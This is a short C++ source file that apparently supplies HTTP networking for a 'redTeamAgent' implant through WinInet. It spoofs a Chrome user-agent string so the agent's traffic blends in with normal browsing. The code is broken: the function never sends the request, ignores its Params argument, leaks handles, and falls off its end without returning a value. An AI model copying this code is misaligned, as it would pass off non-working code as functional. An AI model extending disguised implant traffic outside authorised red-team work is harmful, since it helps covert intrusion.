// This internet.cpp file enables internet functionality for redTeamAgent
#include "Main.h"


/*Initialize the use of the WinInet functions, and provide
the functionality to request and read files on an HTTP server*/ 

LPCSTR UserAgent = "Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 107.0.0.0 Safari / 537.36";

HINTERNET SendRequest(LPCSTR Domain, int Port, LPCSTR URI, LPCSTR Verb, const char* Params) {
	HINTERNET InternetHandle = InternetOpen(UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
	if (InternetHandle == NULL) {
		return NULL;
	}
	HINTERNET ConnectHandle = InternetConnect(InternetHandle, Domain, Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL  );
	if (ConnectHandle == NULL) {
		return NULL;
	}

	HINTERNET hRequest = HttpOpenRequest(ConnectHandle, Verb, URI, "HTTP/1.1", NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION,NULL ); // Create an HTTP request handle
	if (hRequest == NULL) {
		return NULL;
	}
} 